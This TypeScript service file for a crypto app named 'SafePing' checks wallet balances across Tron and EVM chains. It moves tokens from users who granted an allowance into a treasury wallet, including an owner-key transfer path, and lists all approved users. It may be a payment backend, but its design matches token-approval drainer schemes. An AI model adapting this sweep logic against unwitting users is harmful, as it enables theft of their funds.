// =================================
// 🔗 SafePing Main Service
// =================================

import { BlockchainResult, ChainType, CurrencyType, TransferResult, WalletsWithBalances } from "@/types";
import { TronService } from "./tronService";
import { EVMService } from "./evmService";
import { TOKENS } from "@/constants";

export class BlockchainService {
  private static instance: BlockchainService;

  private constructor() {}

  static getInstance(): BlockchainService {
    if (!BlockchainService.instance) {
      BlockchainService.instance = new BlockchainService();
    }
    return BlockchainService.instance;
  }

  /**
   * Get user's native token balance
   */
  async getNativeBalance(chain: ChainType, address: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getNativeBalance(address);
      } else {
        return await EVMService.getNativeBalance(chain, address);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Get user's token balance
   */
  async getTokenBalance(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getTokenBalance(currency, userAddress);
      } else {
        return await EVMService.getTokenBalance(chain, currency, userAddress);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Get real-time balances for wallets (both native and tokens)
   */
  async getNativeAndTokenBalances(
    wallets: Array<{ chain: ChainType; address: string }>
  ): Promise<WalletsWithBalances[]> {
    console.log(`\n=== WALLET BALANCES ===`);
    console.log(`Fetching balances for ${wallets.length} addresses...`);

    const balancePromises = wallets.map(async wallet => {
      try {
        console.log(`\n--- Fetching balances for ${wallet.chain} address: ${wallet.address} ---`);

        const balances: { [key: string]: string } = {};
        const nativeBalance = await this.getNativeBalance(wallet.chain, wallet.address);
        balances["native"] = nativeBalance;

        for (const token of TOKENS) {
          balances[token] = await this.getTokenBalance(wallet.chain, token as CurrencyType, wallet.address);
        }

        return {
          chain: wallet.chain,
          address: wallet.address,
          balances
        };
      } catch (error) {
        console.error(`❌ Error fetching balances for ${wallet.chain} wallet ${wallet.address}:`, error);
        // Return default values if balance fetching fails
        return {
          chain: wallet.chain,
          address: wallet.address,
          balances: { native: "0.000000" }
        };
      }
    });

    const results = (await Promise.all(balancePromises)) as WalletsWithBalances[];
    console.log(`\n✅ Successfully fetched balances for ${results.length} wallets`);
    console.log(`=== END WALLET BALANCES ===\n`);
    return results;
  }

  /**
   * Transfer token from approved user
   */
  async transferFromUser(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUser(currency, fromAddress, toAddress, amount);
      } else {
        return await EVMService.transferFromUser(chain, currency, fromAddress, toAddress, amount);
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Execute auto-transfer after user approval (EVM chains)
   */
  async executeAutoTransfer(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      // Get treasury address from database instead of environment variables
      const { getDatabase } = await import("@/lib/mysql");
      const db = getDatabase();
      const treasuryWallet = await db.getTreasuryWallet(chain);

      if (!treasuryWallet || !treasuryWallet.address) {
        return {
          success: false,
          error: `No treasury wallet configured for ${chain}`,
          transferSuccess: false
        };
      }

      const treasuryAddress = treasuryWallet.address;

      // Execute transfer using the SafePing contract
      const result = await this.transferFromUser(chain, currency, fromAddress, treasuryAddress, amount);

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Auto-transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Auto-transfer failed",
        transferSuccess: false
      };
    }
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  async transferFromUserAsOwner(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUserAsOwner(currency, fromAddress, toAddress, amount);
      } else {
        return await EVMService.transferFromUserAsOwner(chain, currency, fromAddress, toAddress, amount);
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Send webhook notification for payment status change
   */
  private async sendPaymentWebhook(paymentId: string, status: string, transferResult: TransferResult): Promise<void> {
    try {
      const webhookUrl = process.env.WEBHOOK_URL;
      if (!webhookUrl) return;

      const payload = {
        payment_id: paymentId,
        status: status,
        transfer_tx_hash: transferResult.txHash,
        timestamp: new Date().toISOString(),
        chain: transferResult.chain || "unknown"
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      // Silent error handling for production
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  async getUserAllowance(chain: ChainType, userAddress: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserAllowance(chain, userAddress);
      } else {
        return await EVMService.getUserAllowance(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      if (chain === "tron") {
        return await TronService.getAllApprovedUsers(chain);
      } else {
        return await EVMService.getAllApprovedUsers(chain);
      }
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  async revokeUserApproval(chain: ChainType, userAddress: string): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.revokeUserApproval(chain, userAddress);
      } else {
        return await EVMService.revokeUserApproval(chain, userAddress);
      }
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }
}

// Export singleton instance
export const blockchainService = BlockchainService.getInstance();
